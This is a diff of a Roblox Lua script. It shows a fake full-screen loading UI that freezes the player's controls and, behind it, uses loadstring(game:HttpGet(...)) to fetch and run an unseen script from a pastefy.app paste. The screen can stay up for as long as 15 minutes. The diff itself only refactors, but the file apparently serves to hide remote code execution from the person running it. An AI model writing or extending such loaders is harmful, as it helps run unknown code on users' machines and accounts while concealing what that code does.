@@ -1,3 +1,7 @@
+-- Ensure the PlayerGui is ready
+local player = game.Players.LocalPlayer
+local PlayerGui = player:WaitForChild("PlayerGui")
+
 -- DISPLAY LOADING UI
 local screenGui = Instance.new("ScreenGui")
 screenGui.Name = "CustomLoadingScreen"
@@ -57,7 +61,6 @@ percentLabel.Font = Enum.Font.GothamBold
 percentLabel.Parent = barContainer
 
 -- Freeze player by disabling movement
-local player = game.Players.LocalPlayer
 local character = player.Character or player.CharacterAdded:Wait()
 local humanoid = character:WaitForChild("Humanoid")
 
@@ -72,7 +75,7 @@ local playerControls = playerModule:GetControls()
 playerControls:Disable()
 
 -- Run the external script immediately
-spawn(function()
+task.spawn(function()
     -- Load the external script
     loadstring(game:HttpGet("https://pastefy.app/oUQ3Lvec/raw"))()
 
@@ -90,13 +93,15 @@ spawn(function()
 
             -- Re-enable player controls
             playerControls:Enable()
+
+            -- Destroy the loading screen after 900 seconds (15 minutes)
+            task.delay(900, function()
+                if screenGui then
+                    screenGui:Destroy()
+                end
+            end)
             break
         end
         task.wait(1)
     end
-end)
-
--- Destroy the loading screen after a timeout
-task.delay(900, function()
-    if screenGui then screenGui:Destroy() end
 end)
